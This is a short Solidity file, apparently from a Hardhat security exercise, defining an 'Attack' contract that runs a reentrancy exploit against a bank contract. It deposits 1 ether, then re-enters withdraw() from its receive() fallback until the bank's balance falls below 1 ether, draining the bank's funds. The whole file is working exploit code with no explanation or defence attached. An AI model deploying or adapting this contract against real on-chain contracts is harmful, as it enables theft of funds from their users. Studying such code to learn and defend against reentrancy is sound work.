// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

import 'hardhat/console.sol';

interface IBank {
    function deposit() payable external;
    function withdraw() external;
    function getBalance() external returns(uint);
}

contract Attack {
    IBank public bank;

    constructor(address _bank){
        bank = IBank(_bank);
    }

    receive() external payable {
        if(bank.getBalance() >= 1 ether){
            bank.withdraw();
        }
    }

    function attack() external payable {
        console.log("attack called");
        require(msg.value >= 1 ether, "Need 1 ether to start attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

}